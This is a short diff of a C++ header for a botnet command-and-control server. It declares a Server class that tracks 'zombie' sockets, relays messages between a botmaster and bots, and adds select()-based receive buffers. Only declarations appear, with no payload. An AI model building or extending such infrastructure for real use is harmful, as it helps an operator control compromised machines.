@@ -11,6 +11,9 @@
 #define BOTMASTER 1
 #define ZOMBIE	  2
 
+#define BOTMASTERDISCONNECT 3
+#define BOTMDISCONNECT 4
+
 class Server
 {
 public:
@@ -20,15 +23,18 @@ public:
 	bool init();
 	int cleanUp();
 
+	void waiting();
+
 	bool createListeningSocket();
-	int waitForConnection();
+	int acceptConnection();
 
 	void sendToZombies(const std::string& msg);
 	bool sendToZombie(SOCKET zombie, const std::string& msg);
 	bool sendToBotmaster(const std::string& msg);
 
 	bool receive();
-	std::string getMessage();
+	std::string getBotMasterMessage();
+	std::vector<std::string> getBotMessages();
 
 private:
 	std::string m_IpAddress;
@@ -39,5 +45,12 @@ private:
 
 	std::vector<SOCKET> m_Zombies;
 
-	char m_Buf[4096];
+	//rcv states
+	std::string m_BotMasterBuf;
+
+	std::vector<std::pair<SOCKET, std::string>> m_BotBufs;
+
+	//set of socket descriptors for select() 
+	fd_set m_Readfds;
+	SOCKET m_RdySocket;
 };
